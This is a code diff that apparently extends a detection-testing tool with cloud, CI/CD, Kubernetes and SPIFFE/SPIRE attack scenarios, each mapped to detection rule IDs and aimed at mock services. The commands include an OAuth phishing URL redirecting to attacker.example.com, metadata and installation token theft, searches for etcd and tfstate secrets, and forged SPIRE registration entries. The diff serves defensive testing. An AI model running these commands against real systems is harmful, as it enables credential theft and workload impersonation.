@@ -362,6 +362,115 @@ SCENARIOS = {
         description="Identify env var injection points",
         detection_rules=[],
     ),
+
+    # Level 6: Infrastructure
+    "s6-01": Scenario(
+        id="s6-01",
+        name="OAuth App Consent Phishing",
+        level=6,
+        target="cloud-workload",
+        commands=[
+            "curl -s http://mock-oauth:8090/.well-known/openid-configuration 2>/dev/null | python3 -m json.tool || echo 'OAuth provider not reachable'",
+            "echo 'Phishing URL: http://mock-oauth:8090/authorize?client_id=demo-malicious-app&scope=admin:org+repo+user:email&redirect_uri=https://attacker.example.com/callback'",
+            "curl -s -X POST http://mock-oauth:8090/oauth/token -d 'grant_type=client_credentials&client_id=demo-malicious-app&client_secret=demo-client-secret-FAKE&scope=admin:org repo' 2>/dev/null | python3 -m json.tool || echo 'Token exchange failed'",
+        ],
+        description="Craft malicious OAuth app requesting excessive permissions for consent phishing",
+        detection_rules=["100907", "100853"],
+    ),
+    "s6-02": Scenario(
+        id="s6-02",
+        name="GitHub App Installation Token Theft",
+        level=6,
+        target="cicd-runner",
+        commands=[
+            "env | grep -i GITHUB 2>/dev/null || echo 'No GitHub env vars'",
+            "curl -s -X POST http://mock-cicd:8080/github/app/installations/12345/access_tokens 2>/dev/null | python3 -m json.tool || echo 'Mock CI/CD not reachable'",
+            "curl -s http://mock-cicd:8080/github/actions/oidc/token 2>/dev/null | python3 -m json.tool || echo 'OIDC endpoint not available'",
+        ],
+        description="Steal GitHub App installation tokens from compromised CI/CD runner",
+        detection_rules=["100800", "100901", "100952"],
+    ),
+    "s6-03": Scenario(
+        id="s6-03",
+        name="Workload Identity Federation Abuse",
+        level=6,
+        target="cloud-workload",
+        commands=[
+            "curl -s -H 'Metadata-Flavor: Google' http://mock-gcp-metadata:1339/computeMetadata/v1/project/project-id 2>/dev/null || echo 'GCP metadata not reachable'",
+            "curl -s -H 'Metadata-Flavor: Google' http://mock-gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/ 2>/dev/null || echo 'SA enum failed'",
+            "curl -s -H 'Metadata-Flavor: Google' http://mock-gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null | python3 -m json.tool || echo 'Token theft failed'",
+        ],
+        description="Abuse misconfigured GCP Workload Identity Federation for cloud access",
+        detection_rules=["100653", "100654", "100907", "100950"],
+    ),
+    "s6-04": Scenario(
+        id="s6-04",
+        name="Terraform State File Credential Exposure",
+        level=6,
+        target="cloud-workload",
+        commands=[
+            "find / -name '*.tfstate' 2>/dev/null || echo 'No tfstate files found'",
+            "cat ~/.terraformrc 2>/dev/null || echo 'No Terraform Cloud config'",
+            "echo 'Would run: jq .resources[].instances[].attributes terraform.tfstate | grep -i key'",
+        ],
+        description="Exploit exposed Terraform state files to extract cloud credentials",
+        detection_rules=["100600", "100912", "100900"],
+    ),
+    "s6-05": Scenario(
+        id="s6-05",
+        name="Kubernetes etcd Direct Access",
+        level=6,
+        target="k8s-node-1",
+        commands=[
+            "ls -la /var/lib/etcd/ 2>/dev/null || echo 'etcd directory not mounted'",
+            "ls /etc/kubernetes/pki/etcd/ 2>/dev/null || echo 'No etcd PKI directory'",
+            "echo 'Would run: etcdctl get /registry/secrets --prefix --keys-only'",
+            "ls -la /var/lib/etcd/member/snap/ 2>/dev/null || echo 'No etcd snapshot files'",
+        ],
+        description="Directly access etcd to bypass K8s RBAC and extract cluster secrets",
+        detection_rules=["100756", "100764", "100955"],
+    ),
+
+    # Level 7: SPIFFE/SPIRE
+    "s7-01": Scenario(
+        id="s7-01",
+        name="SPIFFE Selector Spoofing",
+        level=7,
+        target="spire-server",
+        commands=[
+            'AGENT_ID=$(/opt/spire/bin/spire-server agent list -socketPath /tmp/spire-server/private/api.sock 2>/dev/null | grep -oP "spiffe://[^\\s\\"]*" | head -1); '
+            '/opt/spire/bin/spire-server entry create -parentID "$AGENT_ID" -spiffeID "spiffe://example.org/web-frontend" -selector "unix:uid:1000" -socketPath /tmp/spire-server/private/api.sock 2>&1 || true',
+            'AGENT_ID=$(/opt/spire/bin/spire-server agent list -socketPath /tmp/spire-server/private/api.sock 2>/dev/null | grep -oP "spiffe://[^\\s\\"]*" | head -1); '
+            '/opt/spire/bin/spire-server entry create -parentID "$AGENT_ID" -spiffeID "spiffe://example.org/workload-evil" -selector "unix:uid:1000" -socketPath /tmp/spire-server/private/api.sock 2>&1 || true',
+        ],
+        description="Create overlapping registration entries for identity spoofing",
+        detection_rules=["101020", "101021"],
+    ),
+    "s7-02": Scenario(
+        id="s7-02",
+        name="SVID Credential Harvesting",
+        level=7,
+        target="spire-agent",
+        commands=[
+            "ls -la /opt/spire/sockets/workload_api.sock 2>/dev/null || echo 'No Workload API socket'",
+            "for i in $(seq 1 12); do /opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock -silent 2>/dev/null; done || echo 'SVID burst complete'",
+        ],
+        description="Rapidly harvest SVIDs via Workload API socket",
+        detection_rules=["101000", "101003"],
+    ),
+    "s7-03": Scenario(
+        id="s7-03",
+        name="Registration Entry Tampering",
+        level=7,
+        target="spire-server",
+        commands=[
+            "/opt/spire/bin/spire-server entry show -socketPath /tmp/spire-server/private/api.sock 2>&1 | head -30 || echo 'Cannot list entries'",
+            'AGENT_ID=$(/opt/spire/bin/spire-server agent list -socketPath /tmp/spire-server/private/api.sock 2>/dev/null | grep -oP "spiffe://[^\\s\\"]*" | head -1); '
+            '/opt/spire/bin/spire-server entry create -parentID "$AGENT_ID" -spiffeID "spiffe://example.org/admin-service" -selector "unix:uid:0" -socketPath /tmp/spire-server/private/api.sock 2>&1 || true',
+        ],
+        description="Manipulate SPIRE registration entries for workload impersonation",
+        detection_rules=["101020", "101022"],
+    ),
 }
 
 
@@ -536,6 +645,8 @@ def list_scenarios():
                 3: "Privilege Escalation",
                 4: "Lateral Movement",
                 5: "Persistence",
+                6: "Infrastructure",
+                7: "SPIFFE/SPIRE",
             }
             print(f"\n--- Level {current_level}: {level_names.get(current_level, 'Unknown')} ---")
 
@@ -582,7 +693,7 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     parser.add_argument("--all", action="store_true", help="Run all scenarios")
-    parser.add_argument("--level", type=int, choices=[1, 2, 3, 4, 5], help="Run scenarios for specific level")
+    parser.add_argument("--level", type=int, choices=[1, 2, 3, 4, 5, 6, 7], help="Run scenarios for specific level")
     parser.add_argument("--scenario", type=str, help="Run specific scenario (e.g., s2-01)")
     parser.add_argument("--list", action="store_true", help="List all scenarios")
     parser.add_argument("--verbose", "-v", action="store_true", help="Show command output")
